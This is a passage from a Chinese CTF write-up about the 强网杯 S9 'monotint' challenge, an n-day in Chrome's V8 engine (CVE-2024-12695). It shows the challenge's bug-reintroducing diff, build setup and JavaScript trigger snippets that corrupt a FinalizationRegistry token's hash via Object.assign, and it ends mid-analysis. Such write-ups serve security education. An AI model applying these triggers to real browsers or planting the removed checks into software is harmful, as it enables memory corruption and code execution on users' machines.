---
title: 强网杯S9 Real World - monotint
url: https://mp.weixin.qq.com/s/oGUMwn5m9P5dnvGDEZ464g
source: Doonsec's feed
date: 2026-01-31
fetch_date: 2026-02-01T04:25:28.943050
---

# 强网杯S9 Real World - monotint

![cover_image](https://mmbiz.qpic.cn/sz_mmbiz_jpg/1UG7KPNHN8GqPJd2ssePqMrPRia8FoneRhhsHe4KVoiap3ndzSQ3MtzjiafX3bILX2SicDicxZf3r6Uh4fx0oHTyaNQ/0?wx_fmt=jpeg)

# 强网杯S9 Real World - monotint

flyyyy
flyyyy

看雪学苑

![]()

在小说阅读器中沉浸阅读

本次强网杯线下和0x300R的师傅们一起打了，其他师傅都太强啦。但最后一天的时间很短，我们最后demo的4题，基本都因为环境问题，没有成功，其中就包括了我这里demo 的monotint，一道浏览器的nday复现。

第一个坑是关于v8沙箱的问题。这道题目的chrome版本是139.0.7258.128，启动参数—no-sandbox，意味着render rce之后就可以任意代码执行。但是正常情况下v8沙箱在这个版本下是默认开启的，所以我本地编译了一个开启v8沙箱的chrome，在这个基础上进行利用，但是后来发现其实题目是没有编译v8的沙箱的，所以那一段沙箱逃逸的逻辑根本没有使用到，耽误了很久的时间……（以后还是直接上去测题目给的虚拟机。

第二个坑是最后弹计算器的问题。公告和题目的信息是分开的，因此没有注意到，公告中提到了为了降低演示的难度，可以自选方法进行验证rce。所以最后花了一段时间去解决弹计算器的问题，其实只需要xauth给个权限可以了，这里需要感谢组里的两位大哥@leommxj和@m4x，帮助我解决了弹计算器的问题。

第三个坑是cpu保护的问题。公告中提到了现场演示机器的cpu是intel 14gen，不过我确实没有忘pku内存保护的方向去想，所以最后的利用部分造成了问题。绕过方式也很简单，jit spray或者写一个wasm函数绕过就行。

# 题目信息

题目除了下发了一个虚拟机之外，虚拟机里还有一个启动脚本和一段diff。

所以查看了下启动参数，发现没有沙箱，所以只需要考虑render rce，那么主要需要思考的是v8侧的利用。

```
/opt/chromium.org/chromium/chromium-browser --no-sandbox
```

接着查看版本信息，chrome版本是139.0.7258.128，v8版本是13.9.205.19

![](https://mmbiz.qpic.cn/sz_mmbiz_png/1UG7KPNHN8GqPJd2ssePqMrPRia8FoneRJ3ibGNyV39zmcGrl0SzrgTmhtm3cDeGsHxe0kHm6ZFY435oyFicqL0LA/640?wx_fmt=png&from=appmsg)

看到了v8的版本不算新，因此看了下commit hash，8月4号的提交，那么之前p0的Big sleep挖出来的CVE-2025-9132是可以直接打的，但是我没准备 :(

由于笔者并没有提前准备1day（科恩的师傅应该是有的，所以最后也只有他们demo成功了，太强了），所以我只能看题目准备了什么diff。

![](https://mmbiz.qpic.cn/sz_mmbiz_png/1UG7KPNHN8GqPJd2ssePqMrPRia8FoneRbSQLsI0WwPsRwllfM3NPLEOK4Mdlj4lESqDGPhX7sM8TJoXI8Ax8dA/640?wx_fmt=png&from=appmsg)![]()

diff信息，但是看着就觉得很眼熟，之前似乎在issue tracker上看到过，于是关键词搜索，就发现了issue tracker上公开的报告，接着就搜索到了公开的blog分析和完整的脚本，编号是CVE-2024-12695。

```
diff --git a/v8/src/builtins/builtins-object-gen.cc b/v8/src/builtins/builtins-object-gen.cc
index b0aeb178..161d9bdf 100644
--- a/v8/src/builtins/builtins-object-gen.cc
+++ b/v8/src/builtins/builtins-object-gen.cc
@@ -511,13 +511,6 @@ TF_BUILTIN(ObjectAssign, ObjectBuiltinsAssembler) {
     GotoIfNot(TaggedEqual(LoadElements(CAST(to)), EmptyFixedArrayConstant()),
               &slow_path);

-    // Ensure the properties field is not used to store a hash.
-    TNode<Object> properties = LoadJSReceiverPropertiesOrHash(to);
-    GotoIf(TaggedIsSmi(properties), &slow_path);
-    CSA_DCHECK(this,
-               Word32Or(TaggedEqual(properties, EmptyFixedArrayConstant()),
-                        IsPropertyArray(CAST(properties))));
-
     Label continue_fast_path(this), runtime_map_lookup(this, Label::kDeferred);

     // Check if our particular source->target combination is fast clonable.

diff --git a/v8/src/objects/js-weak-refs.cc b/v8/src/objects/js-weak-refs.cc
index f125cc63..d6d0e36b 100644
--- a/v8/src/objects/js-weak-refs.cc
+++ b/v8/src/objects/js-weak-refs.cc
@@ -103,7 +103,7 @@ void JSFinalizationRegistry::RemoveCellFromUnregisterTokenMap(
     Tagged<HeapObject> unregister_token = weak_cell->unregister_token();
     uint32_t key = Smi::ToInt(Object::GetHash(unregister_token));
     InternalIndex entry = key_map->FindEntry(isolate, key);
-    CHECK(entry.is_found());
+    DCHECK(entry.is_found());

     if (IsUndefined(weak_cell->key_list_next(), isolate)) {
       // weak_cell is the only one associated with its key; remove the key
```

对于正常的render rce流程还需要一个v8的沙箱逃逸，因为是默认开启的，所以笔者接下来做了两件事情

* 适配完CVE-2024-12695的利用
* v8进程的沙箱逃逸

在比赛的当天下午6、7点钟这样，已经完成了第一个部分，但是此时笔者并不知道题目下发的虚拟机其实是没有的，因此后面花了大部分时间在v8的沙箱逃逸上……

# 环境搭建

搭chrome的环境

```
git checkout 139.0.7258.128
gclient sync -D
cd v8
patch -p1 < ./patch
cd ../
gn gen out/x64.release
ninja -C out/x64.release -j 22 chrome
```

编译参数

```
is_component_build = false
is_debug = false
symbol_level = 2
blink_symbol_level = 2
v8_symbol_level = 2
dcheck_always_on = false
is_official_build = false
chrome_pgo_phase = 0
v8_enable_sandbox = false
v8_enable_pointer_compression = true
```

搭d8的环境

```
gn gen out/x64.release_v8
ninja -C out/x64.release_v8 -j 22 d8
```

编译参数

```
is_component_build = false
is_debug = false
target_cpu = "x64"
v8_enable_sandbox = false
v8_enable_backtrace = true
v8_enable_disassembler = true
v8_enable_object_print = true
v8_enable_verify_heap = true
dcheck_always_on = false
symbol_level = 2
```

调试chrome的时候如果需要使用d8的调试函数，需要加上--js-flags="--allow-natives-syntax"，由于个人习惯，我还会加上--auto-open-devtools-for-tabs，这样会自动打开devtools。

# 漏洞分析

这个nday详细的分析，我觉得看别人已经公开的就好，我这里根据自己的理解，大致再分析了一下。

## Object.assign缺少类型检查

```
diff --git a/v8/src/builtins/builtins-object-gen.cc b/v8/src/builtins/builtins-object-gen.cc
index b0aeb178..161d9bdf 100644
--- a/v8/src/builtins/builtins-object-gen.cc
+++ b/v8/src/builtins/builtins-object-gen.cc
@@ -511,13 +511,6 @@ TF_BUILTIN(ObjectAssign, ObjectBuiltinsAssembler) {
     GotoIfNot(TaggedEqual(LoadElements(CAST(to)), EmptyFixedArrayConstant()),
               &slow_path);

-    // Ensure the properties field is not used to store a hash.
-    TNode<Object> properties = LoadJSReceiverPropertiesOrHash(to);
-    GotoIf(TaggedIsSmi(properties), &slow_path);
-    CSA_DCHECK(this,
-               Word32Or(TaggedEqual(properties, EmptyFixedArrayConstant()),
-                        IsPropertyArray(CAST(properties))));
-
     Label continue_fast_path(this), runtime_map_lookup(this, Label::kDeferred);
```

从删去的部分不难理解，这里删去的部分其实是对于properties字段的检查，检查这个字段是否是smi，如果是smi则跳转到slow\_path执行后续逻辑；如果不是smi则进入fast\_path。

注意到CSA\_DCHECK，意思是当前字段如果不是smi，那么必须是一个EmptyFixedArray。被删去之后，言下之意就是说这个字段可以为smi，也可以为FixedArray（object）

所以这个检查的含义可以总结为，删去了对于对象properties字段类型的检查，不再检查properties是否为smi或者对象，无论properties字段为smi或者对象都执行同一个fast\_path的流程。此时我们具备了改变对象properties字段的能力。

而这个逻辑位于一个builtin方法TF\_BUILTIN(ObjectAssign, ObjectBuiltinsAssembler)中，所以我们现在知道Object.assign这个方法存在漏洞

可以通过这个代码演示一下。

```
let target = {};
let unregister_token = {};

let registry = new FinalizationRegistry(() => {
print("Callback called");
});
registry.register(target, undefined, unregister_token);
%DebugPrint(unregister_token);
%SystemBreak();

Object.assign(unregister_token, {});
Object.assign(unregister_token, {});
%DebugPrint(unregister_token);
%SystemBreak();
```

当注册完gc监控对象target之后，unregister\_token 产生了hash字段。接着通过Object.assign的快速路径，使得unregister\_token的hash字段被破坏，这个被破坏成了一个FixedArray。

![](https://mmbiz.qpic.cn/sz_mmbiz_png/1UG7KPNHN8GqPJd2ssePqMrPRia8FoneR9F2CsiaUpkhBDHJ4wlge9XibtDic6DiasvUjneHeyxffViccMhjRb1NvXew/640?wx_fmt=png&from=appmsg)![]()

需要解释一下FinalizationRegistry的使用方法

* 第一个参数target是gc监控的对象
* 第二个参数undefined是回调函数执行时需要用到的值。当 target 被回收，回调函数被调用时，这个值会作为参数传给回调函数。
* 第三个参数是取消注册的令牌。如果稍后想要取消对 target 的监控，你可以调用 registry.unregister(unregister\_token)来取消对于回调的执行

+ 注册完毕后会为unregister\_token生成hash字段

上方的register方法是监控了target对象，当target被gc回收时，会执行自定义的回调函数。上方的第三个参数是注册的token，后续调用了Object.assign破坏了hash字段。

## SimpleNumberDictionary越界的产生

调试代码如下

```
let target = {};
let unregister_token = {};

let registry = new FinalizationRegistry(() => {
print("Callback called");
});
registry.register(target, undefined, unregister_token);

Object.assign(unregister_token, {});
Object.assign(unregister_token, {});

target = null;
gc({ type: "major" });
%DebugPrint(registry);
```

这里的diff很简洁，将强制CHECK换成了DCHECK，这个函数JSFinalizationRegistry::RemoveCellFromUnregisterTokenMap由上方提到的unregister调用，意味着执行registry.unregister时不再对entry进行检查。

```
diff--gita/v8/src/objects/js-weak-refs.ccb/v8/src/objects/js-weak-refs.cc
indexf125cc63..d6d0e36b100644
---a/v8/src/objects/js-weak-refs.cc
+++ b/v8/src/objects/js-weak-refs.cc
@@ -103,7 +103,7 @@ voidJSFinalizationRegistry::RemoveCellFromUnregisterTokenMap(
     Tagged<HeapObject> unregister_token = weak_cell->unregister_token();
     uint32_t key = Smi::ToInt(Object::GetHash(unregister_token));
     InternalIndex entry = key_map->FindEntry(isolate, key);
-    CHECK(entry.is_found());
+    DCHECK(entry.is_found());

     if (IsUndefined(weak_cell->key_list_next(), isolate)) {
// weak_cell is the only one associated with its key; remove the key
```

所以对于的hash值不存在于key\_map的情况，entry的值为-1。又由于换成了DCHECK，就会绕过entry.is\_found()的检查。

接着如果当前的weak\_cell prev指针为undefined，则会进入到下方的if循环时，会执行key\_map->ClearEntry(-1)。

```
void JSFinalizationRegistry::RemoveCellF...